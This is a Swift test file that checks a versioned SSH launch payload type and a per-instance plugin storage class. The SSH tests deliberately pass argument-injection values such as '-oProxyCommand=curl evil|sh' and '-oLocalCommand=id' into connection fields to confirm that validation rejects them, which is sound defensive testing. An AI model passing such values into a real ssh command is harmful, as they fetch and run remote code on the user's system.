import Foundation
import Testing

@testable import AinkradAppKitContract

/// Generation 8: the SSH launch contract is one shared, versioned, validated
/// type. It used to be two hand-synced definitions in two repos, with the
/// receiving side placing every field straight into an `ssh` argv.
@Suite("SSHLaunchPayload")
struct SSHLaunchValidationTests {

    @Test(
        "Option-like values are rejected in every field",
        arguments: ["-oProxyCommand=curl evil|sh", "-oLocalCommand=id", "--config=x"])
    func rejectsOptionLikeValues(value: String) {
        // `ssh -o ProxyCommand=<cmd>` runs a shell command. Same class of bug
        // as the git argument injection, in a second place.
        #expect(throws: SSHLaunchPayload.ValidationError.self) {
            try SSHLaunchPayload(host: value, port: 22, username: "u").validated()
        }
        #expect(throws: SSHLaunchPayload.ValidationError.self) {
            try SSHLaunchPayload(host: "h", port: 22, username: value).validated()
        }
        #expect(throws: SSHLaunchPayload.ValidationError.self) {
            try SSHLaunchPayload(host: "h", port: 22, username: "u", identityFile: value).validated()
        }
    }

    @Test("Ordinary connections validate")
    func acceptsOrdinaryConnections() throws {
        let payload = SSHLaunchPayload(
            host: "example.com", port: 2222, username: "ahmed",
            identityFile: "/Users/a/.ssh/id_ed25519")
        #expect(try payload.validated() == payload)
        // A dash *inside* a value is fine — only a leading one is an option.
        #expect(throws: Never.self) {
            try SSHLaunchPayload(host: "my-host.example", port: 22, username: "a-b").validated()
        }
    }

    @Test("Malformed connections are refused")
    func refusesMalformed() {
        #expect(throws: SSHLaunchPayload.ValidationError.self) {
            try SSHLaunchPayload(host: "   ", port: 22, username: "u").validated()
        }
        #expect(throws: SSHLaunchPayload.ValidationError.self) {
            try SSHLaunchPayload(host: "h", port: 0, username: "u").validated()
        }
        #expect(throws: SSHLaunchPayload.ValidationError.self) {
            try SSHLaunchPayload(host: "h", port: 99999, username: "u").validated()
        }
    }

    @Test("A generation-7 payload with no version field still decodes")
    func decodesUnversionedPayload() throws {
        // Leyline at generation 7 emitted no `version`. An un-upgraded plugin
        // must keep working against a generation-8 Terminal.
        let legacy = #"{"kind":"ssh","host":"h","port":22,"username":"u"}"#
        let payload = try #require(SSHLaunchPayload(json: legacy))
        #expect(payload.version == 1)
        #expect(payload.host == "h")
    }

    @Test("Round-trips, and rejects a non-ssh payload")
    func roundTripAndKindCheck() throws {
        let payload = SSHLaunchPayload(host: "h", port: 22, username: "u")
        #expect(SSHLaunchPayload(json: payload.json) == payload)
        #expect(SSHLaunchPayload(json: #"{"kind":"http","host":"h","port":1,"username":"u"}"#) == nil)
        #expect(SSHLaunchPayload(json: "not json") == nil)
    }

    @Test("A payload from a future version is refused")
    func refusesFutureVersion() throws {
        let future = #"{"kind":"ssh","version":99,"host":"h","port":22,"username":"u"}"#
        let payload = try #require(SSHLaunchPayload(json: future))
        #expect(throws: SSHLaunchPayload.ValidationError.self) { try payload.validated() }
    }
}

/// Generation 8: per-instance storage replaces four hand-rolled, address-keyed,
/// never-evicted static dictionaries.
@MainActor
@Suite("PluginInstanceStorage")
struct PluginInstanceStorageTests {

    @Test("A value is created once per instance and reused")
    func createsOncePerInstance() {
        let storage = PluginInstanceStorage<NSObject>()
        let a = PluginInstanceID()
        var creations = 0
        let first = storage.value(for: a) {
            creations += 1
            return NSObject()
        }
        let second = storage.value(for: a) {
            creations += 1
            return NSObject()
        }
        #expect(creations == 1)
        #expect(first === second)
    }

    @Test("Different instances get different values")
    func separatesInstances() {
        let storage = PluginInstanceStorage<NSObject>()
        let first = storage.value(for: PluginInstanceID()) { NSObject() }
        let second = storage.value(for: PluginInstanceID()) { NSObject() }
        #expect(first !== second)
    }

    @Test("remove evicts, returning the value so the caller can close it")
    func removeEvicts() {
        let storage = PluginInstanceStorage<NSObject>()
        let id = PluginInstanceID()
        let value = storage.value(for: id) { NSObject() }
        #expect(storage.count == 1)

        #expect(storage.remove(id) === value)

        // The old static dictionaries never did this — every store ever
        // created lived for the process, holding open databases and FDs.
        #expect(storage.count == 0)
        #expect(storage.remove(id) == nil, "removing twice must be safe")
    }

    @Test("Instance ids are values, never recycled addresses")
    func idsAreDistinct() {
        // `ObjectIdentifier(host as AnyObject)` boxed a non-class-bound
        // existential; the box's address is reusable after free, so a new host
        // could collide with a freed one.
        #expect(PluginInstanceID() != PluginInstanceID())
    }
}
